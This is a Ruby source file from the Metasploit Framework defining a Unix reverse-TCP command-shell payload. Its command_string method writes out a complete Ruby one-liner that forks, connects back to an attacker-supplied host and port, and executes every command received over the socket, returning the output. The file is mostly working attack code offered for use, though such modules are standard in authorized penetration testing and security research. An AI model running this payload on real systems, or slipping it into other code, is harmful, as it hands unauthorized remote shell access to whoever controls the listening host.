##
# $Id: reverse_ruby.rb 6854 2009-07-21 15:20:35Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Unix Command Shell, Reverse TCP (via Ruby)',
			'Version'     => '$Revision: 6854 $',
			'Description' => 'Connect back and create a command shell via Ruby',
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Platform'    => 'unix',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::ReverseTcp,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'RequiredCmd' => 'ruby',					
			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
		))
	end

	def generate
		return super + command_string
	end

	def command_string
		"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{datastore['LHOST']}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
	end
end
